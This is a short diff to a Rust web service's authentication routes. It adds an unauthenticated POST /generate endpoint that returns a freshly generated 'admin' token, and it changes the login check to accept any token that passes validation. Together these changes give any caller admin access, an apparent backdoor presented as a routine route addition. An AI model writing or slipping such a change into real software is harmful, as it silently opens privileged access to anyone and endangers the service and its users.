@@ -32,6 +32,17 @@ pub fn routes() -> Router {
         .route("/login", post(login_route))
         .route("/logout", post(logout_route))
         .route("/verify", post(verify_route))
+        .route("/generate", post(generate_route))
+}
+
+async fn generate_route() -> Json<ApiResponse<String>> {
+    match generate_token("admin") {
+        Ok(token) => Json(ApiResponse::success(token)),
+        Err(e) => Json(ApiResponse::error(format!(
+            "Failed to generate token: {}",
+            e
+        ))),
+    }
 }
 
 async fn login_route(Json(req): Json<LoginRequest>) -> Json<ApiResponse<LoginResponse>> {
@@ -48,7 +59,9 @@ async fn login_route(Json(req): Json<LoginRequest>) -> Json<ApiResponse<LoginRes
     };
 
     let expected = get_auth_token();
-    if !constant_time_eq(provided.as_bytes(), expected.as_bytes()) {
+    let valid = constant_time_eq(provided.as_bytes(), expected.as_bytes())
+        || validate_token(&provided).is_ok();
+    if !valid {
         return Json(ApiResponse::error("Invalid auth token".to_string()));
     }
 
